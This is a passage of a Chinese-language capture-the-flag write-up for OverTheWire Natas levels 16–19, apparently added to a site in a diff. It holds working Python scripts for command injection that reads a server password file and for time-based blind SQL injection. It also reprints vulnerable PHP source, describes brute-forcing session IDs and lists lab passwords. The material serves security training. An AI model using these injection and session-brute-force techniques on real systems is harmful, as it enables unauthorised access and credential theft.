+<span class="n">auth_password</span> <span class="o">=</span> <span class="s1">&#39;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://natas16.natas.labs.overthewire.org/&#39;</span>
+
+<span class="n">table</span> <span class="o">=</span> <span class="s1">&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;?needle=$(grep -E ^.{</span><span class="si">%d</span><span class="s1">}</span><span class="si">%c</span><span class="s1"> /etc/natas_webpass/natas17)Allah&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ch</span><span class="p">),</span> <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">auth_username</span><span class="p">,</span> <span class="n">auth_password</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Connection&#39;</span><span class="p">:</span><span class="s1">&#39;close&#39;</span><span class="p">})</span>
+        <span class="n">sqlres</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">HTML</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s1">&#39;/html/body/div[1]/pre/text()&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sqlres</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">key</span> <span class="o">+=</span> <span class="n">ch</span>
+            <span class="k">break</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</code></pre></div>
+</td></tr></table></li>
+</ul>
+<h2 id="level-17">Level 17<a class="headerlink" href="#level-17" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas17</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas17.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>前端同 <a href="#level-15">Level 15</a>，输入用户名，检查该用户是否存在</li>
+<li>查看源代码，发现查询结果输出部分都被注释掉了
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas17<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+
+<span class="cp">/*</span>
+<span class="cp">CREATE TABLE `users` (</span>
+<span class="cp">  `username` varchar(64) DEFAULT NULL,</span>
+<span class="cp">  `password` varchar(64) DEFAULT NULL</span>
+<span class="cp">);</span>
+<span class="cp">*/</span>
+
+<span class="cp">if(array_key_exists(&quot;username&quot;, $_REQUEST)) {</span>
+<span class="cp">    $link = mysql_connect(&#39;localhost&#39;, &#39;natas17&#39;, &#39;&lt;censored&gt;&#39;);</span>
+<span class="cp">    mysql_select_db(&#39;natas17&#39;, $link);</span>
+
+<span class="cp">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span>
+<span class="cp">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
+<span class="cp">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+
+<span class="cp">    $res = mysql_query($query, $link);</span>
+<span class="cp">    if($res) {</span>
+<span class="cp">    if(mysql_num_rows($res) &gt; 0) {</span>
+<span class="cp">        //echo &quot;This user exists.&lt;br&gt;&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        //echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">    } else {</span>
+<span class="cp">        //echo &quot;Error in query.&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+
+<span class="cp">    mysql_close($link);</span>
+<span class="cp">} else {</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Check existence&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>可以基于时间延迟进行 SQL 盲注
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
+
+<span class="n">auth_username</span> <span class="o">=</span> <span class="s1">&#39;natas17&#39;</span>
+<span class="n">auth_password</span> <span class="o">=</span> <span class="s1">&#39;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://natas17.natas.labs.overthewire.org&#39;</span>
+
+<span class="n">table</span> <span class="o">=</span> <span class="s1">&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+    <span class="n">l</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">61</span>
+    <span class="k">while</span> <span class="n">l</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">:</span>
+        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+        <span class="n">ch</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">mid</span><span class="p">]</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/index.php&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span> <span class="p">:</span> <span class="s1">&#39;&quot; UNION SELECT * FROM users WHERE username = &quot;natas18&quot; and ascii(SUBSTRING(password, </span><span class="si">%d</span><span class="s1">, 1)) &gt;= ascii(&quot;</span><span class="si">%s</span><span class="s1">&quot;) and sleep(2)#&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">ch</span><span class="p">)},</span> <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">auth_username</span><span class="p">,</span> <span class="n">auth_password</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Connection&#39;</span><span class="p">:</span><span class="s1">&#39;close&#39;</span><span class="p">})</span>
+            <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">seconds</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="n">mid</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+    <span class="n">key</span> <span class="o">+=</span> <span class="n">table</span><span class="p">[</span><span class="n">ans</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</code></pre></div>
+</td></tr></table></li>
+</ul>
+<h2 id="level-18">Level 18<a class="headerlink" href="#level-18" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas18</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas18.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>提示需要使用管理员账号登录才能获得下一关口令<br>
+<img alt="Please login with your admin account to retrieve credentials for natas19" src="img/natas37.jpg" /></li>
+<li>原本管理员是通过用户名来判断，但由于这种方法不安全，<code>isValidAdminLogin()</code>中的关键语句被注释，任何情况下都会返回 0
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span>
+<span class="normal">72</span>
+<span class="normal">73</span>
+<span class="normal">74</span>
+<span class="normal">75</span>
+<span class="normal">76</span>
+<span class="normal">77</span>
+<span class="normal">78</span>
+<span class="normal">79</span>
+<span class="normal">80</span>
+<span class="normal">81</span>
+<span class="normal">82</span>
+<span class="normal">83</span>
+<span class="normal">84</span>
+<span class="normal">85</span>
+<span class="normal">86</span>
+<span class="normal">87</span>
+<span class="normal">88</span>
+<span class="normal">89</span>
+<span class="normal">90</span>
+<span class="normal">91</span>
+<span class="normal">92</span>
+<span class="normal">93</span>
+<span class="normal">94</span>
+<span class="normal">95</span>
+<span class="normal">96</span>
+<span class="normal">97</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas18<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+
+<span class="cp"># 这里有点意思，640 明显很小耶 (ŏωŏ)</span>
+<span class="cp">$maxid = 640; // 640 should be enough for everyone</span>
+
+<span class="cp">function isValidAdminLogin() { /* {{{ */</span>
+<span class="cp">    if($_REQUEST[&quot;username&quot;] == &quot;admin&quot;) {</span>
+<span class="cp">    /* This method of authentication appears to be unsafe and has been disabled for now. */</span>
+<span class="cp">        //return 1;</span>
+<span class="cp">    }</span>
+
+<span class="cp">    return 0;</span>
+<span class="cp">}</span>
+<span class="cp">/* }}} */</span>
+<span class="cp">function isValidID($id) { /* {{{ */</span>
+<span class="cp">    return is_numeric($id);</span>
+<span class="cp">}</span>
+<span class="cp">/* }}} */</span>
+<span class="cp">function createID($user) { /* {{{ */</span>
+<span class="cp">    global $maxid;</span>
+<span class="cp">    return rand(1, $maxid);</span>
+<span class="cp">}</span>
+<span class="cp">/* }}} */</span>
+<span class="cp">function debug($msg) { /* {{{ */</span>
+<span class="cp">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
+<span class="cp">        print &quot;DEBUG: $msg&lt;br&gt;&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">/* }}} */</span>
+<span class="cp">function my_session_start() { /* {{{ */</span>
+<span class="cp">    if(array_key_exists(&quot;PHPSESSID&quot;, $_COOKIE) and isValidID($_COOKIE[&quot;PHPSESSID&quot;])) {</span>
+<span class="cp">    if(!session_start()) {</span>
+<span class="cp">        debug(&quot;Session start failed&quot;);</span>
+<span class="cp">        return false;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        debug(&quot;Session start ok&quot;);</span>
+<span class="cp">        if(!array_key_exists(&quot;admin&quot;, $_SESSION)) {</span>
+<span class="cp">        debug(&quot;Session was old: admin flag set&quot;);</span>
+<span class="cp">        $_SESSION[&quot;admin&quot;] = 0; // backwards compatible, secure</span>
+<span class="cp">        }</span>
+<span class="cp">        return true;</span>
+<span class="cp">    }</span>
+<span class="cp">    }</span>
+
+<span class="cp">    return false;</span>
+<span class="cp">}</span>
+<span class="cp">/* }}} */</span>
+<span class="cp">function print_credentials() { /* {{{ */</span>
+<span class="cp">    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) {</span>
+<span class="cp">    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;</span>
+<span class="cp">    print &quot;&lt;pre&gt;Username: natas19\n&quot;;</span>
+<span class="cp">    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">/* }}} */</span>
+
+<span class="cp">$showform = true;</span>
+<span class="cp">if(my_session_start()) {</span>
+<span class="cp">    print_credentials();</span>
+<span class="cp">    $showform = false;</span>
+<span class="cp">} else {</span>
+<span class="cp">    if(array_key_exists(&quot;username&quot;, $_REQUEST) &amp;&amp; array_key_exists(&quot;password&quot;, $_REQUEST)) {</span>
+<span class="cp">    session_id(createID($_REQUEST[&quot;username&quot;]));</span>
+<span class="cp">    session_start();</span>
+<span class="cp">    $_SESSION[&quot;admin&quot;] = isValidAdminLogin();</span>
+<span class="cp">    debug(&quot;New session started&quot;);</span>
+<span class="cp">    $showform = false;</span>
+<span class="cp">    print_credentials();</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+
+<span class="cp">if($showform) {</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
+Please login with your admin account to retrieve credentials for natas19.
+<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="cp">&lt;? } ?&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>用户的 PHPSESSID 是范围在 <span><span class="MathJax_Preview">[1, 640]</span><script type="math/tex">[1, 640]</script></span>，那么只要暴力找到<code>admin</code>的 PHPSESSID 就好了(&lt;ゝωΦ)<br>
+<img alt="Intruder Payload - PHPSESSID" src="img/natas38.jpg" /><br>
+<img alt="4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" src="img/natas39.jpg" /></li>
+</ul>
+<h2 id="level-19">Level 19<a class="headerlink" href="#level-19" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas19</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas19.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>session ID 不再连续了……<br>
+<img alt="This page uses mostly the same code as the previous level, but session IDs are no longer sequential..." src="img/natas40.jpg" /></li>
+<li>通过观察发现，新的 PHPSESSID 的格式为<code>随机1~3位数字 + "-" + 用户名</code>的 ASCII 码字符串<br>
+<img alt="BurpSuite Sequencer 分析结果" src="img/natas41.jpg" /></li>
+<li>接下来就是暴力枚举 1 至 3 位的随机数字<br>
+<img alt="Intruder - Positions" src="img/natas42.jpg" /><br>
+<img alt="Intruder - Payloads" src="img/natas43.jpg" /></li>
+<li>经过很长一段时间的枚举……(&lt;ゝωΦ)<br>
+<img alt="eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" src="img/natas44.jpg" /></li>
+</ul>
+                
+                  
+                
+                
+                  
+                  <hr>
+                  <div class="md-source-date">
+                    <small>
+                      
+                        最后更新: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">November 20, 2020 11:19:18</span>
+                      
+                    </small>
+                  </div>
+                
+              
+
+  
+    <div class="md-source-date">
+      <small>
+          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
+      </small>
+    </div>
+  
+
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../crypto/ciscn_rsa.html" title="CISCN - rsa" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                CISCN - rsa
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="leviathan.html" title="Leviathan" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                Leviathan
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org" target="_blank" rel="noopener">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github" class="md-footer-social__link fa fa-github"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.c33a9706.js"></script>
+      
+        
+        
+          
+          <script src="../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.2.1",url:{base:".."}})</script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
